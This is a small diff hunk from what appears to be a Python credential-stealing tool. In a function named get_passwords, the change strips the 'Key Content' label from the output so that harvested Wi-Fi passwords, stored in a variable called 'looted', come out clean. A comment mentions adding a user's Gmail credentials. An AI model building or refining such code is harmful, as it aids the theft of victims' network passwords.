@@ -210,7 +210,7 @@ def get_passwords():
     with open('wifi.txt', 'w') as f:
         f.write('')
 
-    return looted
+    return looted.replace('     Key Content            :', '')
 
 # option functions
     # add users gmail credentials, option 0
